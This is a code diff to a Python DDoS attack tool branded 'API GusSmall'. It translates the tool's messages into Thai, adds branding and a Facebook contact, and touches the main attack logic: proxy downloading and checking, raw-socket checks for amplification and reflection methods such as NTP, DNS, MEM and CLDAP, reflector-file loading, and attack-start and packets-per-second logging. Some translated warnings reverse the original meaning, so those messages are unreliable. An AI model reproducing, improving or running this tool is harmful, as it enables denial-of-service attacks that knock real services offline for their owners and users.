@@ -104,6 +104,8 @@ class bcolors:
     RESET = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
+    red = '\x1b[31;20m'
+    bold_red = '\x1b[31;1m'
 
 
 def exit(*message):
@@ -1442,19 +1444,20 @@ class ToolsConsole:
 
     @staticmethod
     def usage():
-        print((
+        logger.critical(
                 '..######...##.....##..######...######..##.....##....###....##.......##......\n'
                 '.##....##..##.....##.##....##.##....##.###...###...##.##...##.......##......\n'
                 '.##........##.....##.##.......##.......####.####..##...##..##.......##......\n'
                 '.##...####.##.....##..######...######..##.###.##.##.....##.##.......##......\n'
                 '.##....##..##.....##.......##.......##.##.....##.#########.##.......##......\n'
                 '.##....##..##.....##.##....##.##....##.##.....##.##.....##.##.......##......\n'
-                '..######....#######...######...######..##.....##.##.....##.########.########\n'
-                
-'Welcome: API GusSmall - DDoS Attack Script With Methods\n'
-'Warning: If the Proxy list is empty, the attack will run without proxies\n'
-'If the Proxy file doesnt exist, the script will download proxies and check them.\n'
-'Proxy Type 0 = All in config.json\n'))
+                '..######....#######...######...######..##.....##.##.....##.########.########\n')
+        print((  
+        'ยินดีต้อนรับ: API GusSmall - สคริปต์โจมตี DDoS พร้อมวิธีการ\n'
+        'คำเตือน: หากรายการพร็อกซีว่างเปล่า การโจมตีจะทำงานโดยไม่มีพรอกซี\n'
+        'หากไม่มีไฟล์พร็อกซี สคริปต์จะดาวน์โหลดพร็อกซีและตรวจสอบ\n'
+        'ประเภทพร็อกซี 0 = ทั้งหมดใน config.json\n'
+        f'{bcolors.OKCYAN}[💬]ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong[💬]\n'))
 
     # noinspection PyBroadException
     @staticmethod
@@ -1490,12 +1493,12 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
         proxy_ty = randchoice([4, 5, 1])
     if not proxy_li.exists():
         logger.warning(
-            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
+            f"[🗂]{bcolors.bold_red}| .:APIGusSmall:. | {bcolors.WARNING}ไม่มีไฟล์อยู่ กำลังสร้างไฟล์และดาวน์โหลดพรอกซี.{bcolors.RESET}")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
         with proxy_li.open("w") as wr:
             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
             logger.info(
-                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
+                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING}[💬] กำลังตรวจสอบพรอกซี ซึ่งอาจใช้เวลาสักครู่..{bcolors.RESET}!"
             )
             Proxies = ProxyChecker.checkAll(
                 Proxies, timeout=5, threads=threads,
@@ -1504,9 +1507,10 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
             if not Proxies:
                 exit(
-                    "Proxy Check failed, Your network may be the problem"
-                    " | The target may not be available."
+                    f"[⚜️]{bcolors.bold_red}| .:APIGusSmall:. |[⚠️]การตรวจสอบพร็อกซีล้มเหลว เครือข่ายของคุณอาจมีปัญหา"
+                    " | เป้าหมายอาจไม่พร้อมใช้งาน."
                 )
+                logger.warning(f"{bcolors.OKCYAN}ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong")
             stringBuilder = ""
             for proxy in Proxies:
                 stringBuilder += (proxy.__str__() + "\n")
@@ -1514,10 +1518,10 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
     proxies = ProxyUtiles.readFromFile(proxy_li)
     if proxies:
-        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
+        logger.info(f"{bcolors.WARNING}จำนวนพร็อกซี : {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
     else:
         logger.info(
-            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
+            f"{bcolors.bold_red}| .:APIGusSmall:. |{bcolors.WARNING}[⚠️]ไฟล์พร็อกซีว่างเปล่า, เรียกใช้งานหน่วง API โดยไม่มีพรอกซี[⚠️]{bcolors.RESET}")
         proxies = None
 
     return proxies
@@ -1584,23 +1588,25 @@ if __name__ == '__main__':
                     logger.setLevel("DEBUG")
 
                 if not useragent_li.exists():
-                    exit("The Useragent file doesn't exist ")
+                    exit(f"{bcolors.bold_red}| .:APIGusSmall:. |[⚠️]{bcolors.WARNING} ไม่มีไฟล์ Useragent")
+                    logger.warning(f"{bcolors.OKCYAN}ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong")
                 if not referers_li.exists():
-                    exit("The Referer file doesn't exist ")
+                    exit(f"{bcolors.bold_red}| .:APIGusSmall:. |[⚠️]{bcolors.WARNING} ไม่มีไฟล์ Referer")
+                    logger.warning(f"{bcolors.OKCYAN}ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong")
 
                 uagents = set(a.strip()
                               for a in useragent_li.open("r+").readlines())
                 referers = set(a.strip()
                                for a in referers_li.open("r+").readlines())
 
-                if not uagents: exit("Empty Useragent File ")
-                if not referers: exit("Empty Referer File ")
+                if not uagents: exit(f"[⚜️]{bcolors.WARNING}ไฟล์ Useragent ว่างเปล่า [❌]")
+                if not referers: exit(f"[⚜️]{bcolors.WARNING}ไฟล์ Referer ว่างเปล่า [❌]")
 
                 if threads > 1000:
-                    logger.warning("Thread is higher than 1000")
+                    logger.warning(f"[⚜️]{bcolors.WARNING}จำนวน Thread ต้องสูงกว่า 1,000 [❌]")
                 if rpc > 100:
                     logger.warning(
-                        "RPC (Request Pre Connection) is higher than 100")
+                        f"[⚜️]{bcolors.WARNING}RPC (คำขอการเชื่อมต่อล่วงหน้า) ต้องสูงกว่า 100 [❌]")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
@@ -1616,18 +1622,18 @@ if __name__ == '__main__':
                 try:
                     target = gethostbyname(target)
                 except Exception as e:
-                    exit('Cannot resolve hostname ', url.host, e)
+                    exit(f'{bcolors.red}ไม่สามารถแก้ไขชื่อโฮสต์หรือIPได้ [❌]', url.host, e)
 
                 if port > 65535 or port < 1:
-                    exit("Invalid Port [Min: 1 / Max: 65535] ")
+                    exit(f"{bcolors.red}Port ไม่ถูกต้อง [ต่ำสุด: 1 / สูงสุด: 65535] [❌]")
 
                 if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                         not ToolsConsole.checkRawSocket():
-                    exit("Cannot Create Raw Socket")
+                    exit(f"{bcolors.red} ไม่สามารถสร้าง Raw Socket ได้ [❌]")
 
                 if method in Methods.LAYER4_AMP:
-                    logger.warning("this method need spoofable servers please check")
-                    logger.warning("https://github.com/mucw082")
+                    logger.warning(f"{bcolors.bold_red}| .:APIGusSmall:. |{bcolors.WARNING} วิธีการนี้ต้องใช้เซิร์ฟเวอร์ที่สามารถปลอมแปลงได้ โปรดตรวจสอบ")
+                    logger.warning(f"{bcolors.OKCYAN}ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong")
 
                 threads = int(argv[3])
                 timer = int(argv[4])
@@ -1635,7 +1641,7 @@ if __name__ == '__main__':
                 ref = None
 
                 if not port:
-                    logger.warning("Port Not Selected, Set To Default: 80")
+                    logger.warning(f"{bcolors.bold_red}| .:APIGusSmall:. |{bcolors.WARNING} ไม่ได้เลือก Port ตั้งเป็นค่าเริ่มต้น: 80")
                     port = 80
 
                 if method in {"SYN", "ICMP"}:
@@ -1647,12 +1653,14 @@ if __name__ == '__main__':
                         refl_li = Path(__dir__ / "files" / argfive)
                         if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                             if not refl_li.exists():
-                                exit("The reflector file doesn't exist")
+                                exit(f"{bcolors.bold_red}| .:APIGusSmall:. |{bcolors.red} ไม่มีไฟล์ Reflector❌")
+                                logger.warning(f"{bcolors.OKCYAN}ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong")
                             if len(argv) == 7:
                                 logger.setLevel("DEBUG")
                             ref = set(a.strip()
                                       for a in Tools.IP.findall(refl_li.open("r").read()))
-                            if not ref: exit("Empty Reflector File ")
+                            if not ref: exit(f"{bcolors.bold_red}| .:APIGusSmall:. |{bcolors.red} ไฟล์ Reflector ว่างเปล่า ❗️❗️") 
+                            logger.warning(f"{bcolors.OKCYAN}ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong")
 
                         elif argfive.isdigit() and len(argv) >= 7:
                             if len(argv) == 8:
@@ -1661,7 +1669,8 @@ if __name__ == '__main__':
                             proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
                             proxies = handleProxyList(con, proxy_li, proxy_ty)
                             if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
-                                exit("this method cannot use for layer4 proxy")
+                                exit(f"{bcolors.bold_red}| .:APIGusSmall:. |{bcolors.red} วิธีการนี้ไม่สามารถใช้ประเภทธรรมดา V1 และ ประเภทพร็อกซี V2 ได้ ❌")
+                                logger.warning(f"{bcolors.OKCYAN}ติดต่อได้ที่เฟสบุ๊ค: {bcolors.OKBLUE}Teerawat Sangtong")
 
                         else:
                             logger.setLevel("DEBUG")
@@ -1684,13 +1693,13 @@ if __name__ == '__main__':
                            proxies, protocolid).start()
 
             logger.info(
-                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
+                f"{bcolors.bold_red}| .:APIGusSmall:. | {bcolors.WARNING}⚔️ การโจมตีเริ่มที่{bcolors.OKBLUE} %s{bcolors.WARNING} กับ:{bcolors.OKBLUE} %s{bcolors.WARNING} ฟังชั่น:{bcolors.OKBLUE} %s{bcolors.WARNING} วินาที, Threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
                 % (target or url.host, method, timer, threads))
             event.set()
             ts = time()
             while time() < ts + timer:
                 logger.debug(
-                    f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
+                    f'{bcolors.bold_red}| .:APIGusSmall:. | {bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} ฟังชั่น:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
                     (target or url.host,
                      port or (url.port or 80),
                      method,
